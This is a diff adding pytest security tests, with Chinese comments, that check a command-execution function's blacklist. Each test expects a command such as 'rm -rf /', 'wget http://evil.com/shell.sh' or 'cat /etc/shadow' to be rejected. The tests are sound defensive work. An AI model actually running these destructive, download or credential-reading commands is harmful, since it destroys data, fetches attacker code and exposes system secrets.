@@ -62,6 +62,58 @@ class TestExecute:
         assert len(lines) == 3
 
 
+class TestSecurity:
+    """命令黑名单安全测试"""
+
+    @pytest.mark.asyncio
+    async def test_block_sudo(self):
+        with pytest.raises(ValueError, match="受限操作"):
+            await execute("sudo rm -rf /")
+
+    @pytest.mark.asyncio
+    async def test_block_curl(self):
+        with pytest.raises(ValueError, match="受限操作"):
+            await execute("curl http://evil.com")
+
+    @pytest.mark.asyncio
+    async def test_block_wget(self):
+        with pytest.raises(ValueError, match="受限操作"):
+            await execute("wget http://evil.com/shell.sh")
+
+    @pytest.mark.asyncio
+    async def test_block_cat_shadow(self):
+        with pytest.raises(ValueError, match="受限操作"):
+            await execute("cat /etc/shadow")
+
+    @pytest.mark.asyncio
+    async def test_block_pip_install(self):
+        with pytest.raises(ValueError, match="受限操作"):
+            await execute("pip install malware")
+
+    @pytest.mark.asyncio
+    async def test_block_rm_root(self):
+        with pytest.raises(ValueError, match="受限操作"):
+            await execute("rm -rf /")
+
+    @pytest.mark.asyncio
+    async def test_block_chmod(self):
+        with pytest.raises(ValueError, match="受限操作"):
+            await execute("chmod 777 /etc/passwd")
+
+    @pytest.mark.asyncio
+    async def test_allow_normal_python(self):
+        """正常 Python 代码不应被拦截"""
+        result = await execute('python3 -c "print(42)"')
+        assert result.exit_code == 0
+        assert "42" in result.stdout
+
+    @pytest.mark.asyncio
+    async def test_allow_echo(self):
+        """正常 echo 不应被拦截"""
+        result = await execute("echo hello")
+        assert result.exit_code == 0
+
+
 class TestExecuteAPI:
     """测试 FastAPI 端点"""
 
